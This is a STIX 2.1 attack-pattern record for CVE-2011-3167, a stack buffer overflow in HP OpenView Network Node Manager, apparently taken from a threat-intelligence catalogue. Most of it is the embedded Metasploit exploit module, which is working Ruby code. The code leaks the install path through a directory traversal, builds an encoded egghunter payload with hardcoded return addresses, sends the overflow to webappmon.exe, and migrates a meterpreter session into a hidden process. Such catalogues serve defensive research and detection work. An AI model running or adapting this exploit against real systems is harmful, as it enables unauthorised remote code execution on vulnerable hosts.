{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ad17a093-2c15-4f15-93d2-c9997e0a4d9f",
    "created": "2024-08-14T16:54:09.826724Z",
    "modified": "2024-08-14T16:54:09.826728Z",
    "name": "HP OpenView Network Node Manager ov.dll _OVBuildPath Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.53 prior to NNM_01213 without the SSRT100649 hotfix. By specifying a long 'textFile' argument when calling the 'webappmon.exe' CGI program, an attacker can cause a stack-based buffer overflow and execute arbitrary code.  The vulnerable code is within the \"_OVBuildPath\" function within \"ov.dll\". There are no stack cookies, so exploitation is achieved by overwriting the saved return address.  The vulnerability is due to the use of the function \"_OVConcatPath\" which finally uses \"strcat\" in an insecure way. User controlled data is concatenated to a string which contains the OpenView installation path.  To achieve reliable exploitation a directory traversal in OpenView5.exe (OSVDB 44359) is being used to retrieve OpenView logs and disclose the installation path. If the installation path cannot be guessed the default installation path is used. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/hp_nnm_ovbuildpath_textfile.rb",
            "external_id": "hp_nnm_ovbuildpath_textfile.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-3167"
        },
        {
            "source_name": "reference",
            "url": "https://h20566.www2.hp.com/portal/site/hpsc/public/kb/docDisplay/?docId=emr_na-c03054052"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  HttpFingerPrint = { :method => 'HEAD', :uri => '/OvCgi/webappmon.exe', :pattern => /Hewlett-Packard Development Company/ }\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::Egghunter\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'HP OpenView Network Node Manager ov.dll _OVBuildPath Buffer Overflow',\n        'Description' => %q{\n          This module exploits a stack buffer overflow in HP OpenView Network Node\n          Manager 7.53 prior to NNM_01213 without the SSRT100649 hotfix. By specifying a long\n          'textFile' argument when calling the 'webappmon.exe' CGI program, an attacker can\n          cause a stack-based buffer overflow and execute arbitrary code.\n\n          The vulnerable code is within the \"_OVBuildPath\" function within \"ov.dll\". There\n          are no stack cookies, so exploitation is achieved by overwriting the saved return\n          address.\n\n          The vulnerability is due to the use of the function \"_OVConcatPath\" which finally\n          uses \"strcat\" in an insecure way. User controlled data is concatenated to a string\n          which contains the OpenView installation path.\n\n          To achieve reliable exploitation a directory traversal in OpenView5.exe\n          (OSVDB 44359) is being used to retrieve OpenView logs and disclose the installation\n          path. If the installation path cannot be guessed the default installation path\n          is used.\n        },\n        'Author' => [\n          'Anyway <Aniway.Anyway[at]gmail.com>', # Vulnerability Discovery\n          'juan vazquez', # Metasploit module\n          'sinn3r' # Metasploit fu\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'CVE', '2011-3167' ],\n          [ 'OSVDB', '76775' ],\n          [ 'BID', '50471' ],\n          [ 'ZDI', '12-002' ],\n          [ 'URL', 'https://h20566.www2.hp.com/portal/site/hpsc/public/kb/docDisplay/?docId=emr_na-c03054052' ]\n        ],\n        'Payload' => {\n          'Space' => 950,\n          'BadChars' => [*(0x00..0x09)].pack(\"C*\") + [*(0x0b..0x23)].pack(\"C*\") + [0x26, 0x2b, 0x3c, 0x3e, 0x5b, 0x5d, 0x5e, 0x60, 0x7e, 0x7f].pack(\"C*\"),\n          'DisableNops' => true,\n          'EncoderOptions' =>\n              {\n                'BufferRegister' => 'EDI' # Egghunter jmp edi\n              }\n        },\n        'Platform' => 'win',\n        'Targets' => [\n          [\n            'HP OpenView Network Node Manager 7.53 / Windows 2000 SP4 & Windows XP SP3',\n            # Patches installed:\n            # * ECS_00048\n            # * NNM_01128\n            # * NNM_01172\n            # * NNM_01187\n            {\n              'Offset' => 1067,\n              'Ret' => 0x5a41656a, # pop/pop/ret - in ov.dll (v1.30.5.8002)\n              'JmpESP' => 0x5a4251c5, # call esp - in ov.dll\n              'EggAdjust' => 4,\n              'ReadableAddress' => 0x5a466930 # ov.dll\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2011-11-01',\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_migrate\n              stdapi_sys_config_getenv\n              stdapi_sys_config_sysinfo\n              stdapi_sys_process_execute\n            ]\n          }\n        }\n      )\n    )\n\n    self.needs_cleanup = true\n  end\n\n  # The following code allows to migrate if having into account\n  # that over Windows XP permissions aren't granted on %windir%\\system32\n  #\n  # Code ripped from \"modules/post/windows/manage/migrate.rb\". See it\n  # for more information\n  def on_new_session(client)\n    if client.type != \"meterpreter\"\n      print_error(\"NOTE: you must use a meterpreter payload in order to process migration.\")\n      return\n    end\n\n    client.core.use(\"stdapi\") if not client.ext.aliases.include?(\"stdapi\")\n\n    # Use the system path for executable to run except the wordpad\n    if client.sys.config.sysinfo[\"OS\"] =~ /Windows XP/\n      windir = client.sys.config.getenv('ProgramFiles')\n      cmd = \"#{windir}\\\\Windows NT\\\\Accessories\\\\wordpad.exe\"\n    else # Windows 2000\n      cmd = \"notepad.exe\"\n    end\n\n    # run hidden\n    print_status(\"Spawning #{cmd.split(\"\\\\\").last} process to migrate to\")\n    proc = client.sys.process.execute(cmd, nil, { 'Hidden' => true })\n    target_pid = proc.pid\n\n    begin\n      print_good(\"Migrating to #{target_pid}\")\n      client.core.migrate(target_pid)\n      print_good(\"Successfully migrated to process #{target_pid}\")\n    rescue ::Exception => e\n      print_error(\"Could not migrate in to process.\")\n      print_error(e.to_s)\n    end\n  end\n\n  # Tries to guess the HP OpenView install dir via the Directory traversal identified\n  # by OSVDB 44359.\n  # If OSVDB 44359 doesn't allow to retrieve the installation path the default one\n  # (C:\\Program Files\\HP OpenView\\) is used.\n  # Directory Traversal used:\n  # http://host/OvCgi/OpenView5.exe?Context=Snmp&Action=../../../log/setup.log\n  def get_install_path\n    cgi = '/OvCgi/OpenView5.exe'\n    web_session = rand_text_numeric(3)\n    my_cookie = \"OvOSLocale=English_United States.1252; \"\n    my_cookie << \"OvAcceptLang=en-US; \"\n    my_cookie << \"OvJavaLocale=en_US.Cp1252; \"\n    my_cookie << \"OvWebSession=#{web_session}:AnyUser:\"\n\n    payload = \"../../../log/setup.log\"\n    res = send_request_cgi({\n      'uri'\t=> cgi,\n      'cookie' => my_cookie,\n      'method'\t=> \"GET\",\n      'vars_get' =>\n        {\n          'Target' => \"Main\",\n          'Scope' => \"Snmp\",\n          'Action' => payload\n        }\n    }, 5)\n\n    installation_path = \"\"\n    if res and res.code == 200 and\n       res.body =~ /([A-Z]:\\\\.*\\\\)log/\n      print_status(\"Installation Path Found in #{$1}\")\n      installation_path = $1\n    else\n      print_status(\"Installation Path Not Found using the default\")\n      installation_path = \"C:\\\\Program Files\\\\HP OpenView\\\\\"\n    end\n\n    return installation_path\n  end\n\n  def exploit\n    print_status(\"Trying target #{target.name}...\")\n\n    install_path = get_install_path\n    install_path << \"help\\\\English_United States.1252\"\n\n    eggoptions = {\n      :checksum => true,\n    }\n    hunter, egg = generate_egghunter(payload.encoded, payload_badchars, eggoptions)\n\n    [ 'x86/alpha_mixed'].each { |name|\n      enc = framework.encoders.create(name)\n      if name =~ /alpha/\n        # If control is transferred to the decoder via \"call esp\" BufferOfset\n        # shoulds be adjusted.\n        if target[\"EggAdjust\"] and target[\"EggAdjust\"] > 0\n          enc_options = {\n            'BufferRegister' => 'ESP',\n            'BufferOffset' => target[\"EggAdjust\"]\n          }\n          enc.datastore.import_options_from_hash(enc_options)\n        else\n          enc.datastore.import_options_from_hash({ 'BufferRegister' => 'ESP' })\n        end\n      end\n      hunter = enc.encode(hunter, nil, nil, platform)\n    }\n\n    offset = target['Offset'] - install_path.length - egg.length\n\n    my_payload = egg\n    my_payload << rand_text_alphanumeric(offset)\n    my_payload << [target.ret].pack(\"V\")\n    my_payload << rand_text_alphanumeric(4) # Padding\n    my_payload << [target[\"ReadableAddress\"]].pack(\"V\")\n    my_payload << [target[\"JmpESP\"]].pack(\"V\")\n    my_payload << hunter\n\n    buf = \"-textFile+#{my_payload}+++++++++++++++++++++++\"\n    buf << \"-appendSelectList+-appendSelectListToTitle+%09%09++++++\"\n    buf << \"-commandHeading+%22Protocol+++++++++Port++++++++Service%22+++++++++++++++++++++++\"\n    buf << \"-dataLine+2+\"\n    buf << \"-commandTitle+%22Services%22+%09%09++++++\"\n    buf << \"-iconName+%22Services%22+++++++++++++++++++++++\"\n    buf << \"-cmd+rnetstat+\"\n    buf << \"-S\"\n\n    web_session = rand_text_numeric(3)\n    my_cookie = \"OvOSLocale=English_United States.1252; \"\n    my_cookie << \"OvAcceptLang=en-US; \"\n    my_cookie << \"OvJavaLocale=en_US.Cp1252; \"\n    my_cookie << \"OvWebSession=#{web_session}:AnyUser:\"\n\n    cgi = '/OvCgi/webappmon.exe'\n\n    res = send_request_cgi({\n      'uri' => cgi,\n      'cookie' => my_cookie,\n      'method' => \"POST\",\n      'vars_post' =>\n        {\n          'ins' => 'nowait',\n          'sel' => rand_text_alphanumeric(15),\n          'app' => 'IP Tables',\n          'act' => 'Services',\n          'help' => '',\n          'cache' => rand_text_numeric(4)\n        },\n      'data' => \"arg=#{buf}\" # Avoid uri encoding\n    }, 3)\n\n    if res and res.code != 502\n      print_error(\"Eek! We weren't expecting a response, but we got one\")\n    end\n\n    handler\n  end\nend\n\n=begin\n\n* migrate to %windir%/system32/notepad.exe fails on Windows XP SP3\n\nmeterpreter > run post/windows/manage/migrate\n\n[*] Running module against HOME-F006222D6C\n[*] Current server process: webappmon.exe (7064)\n[*] Spawning notepad.exe process to migrate to\n[-] Post failed: Rex::Post::Meterpreter::RequestError stdapi_sys_process_execute: Operation failed: Access is denied.\n[-] Call stack:\n[-]   /projects/exploiting/trunk/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:163:in `execute'\n[-]   (eval):80:in `create_temp_proc'\n[-]   (eval):49:in `run'\n=end\n",
    "x_mitre_disclosure_date": "2011-11-01",
    "x_mitre_platforms": [
        "win'"
    ]
}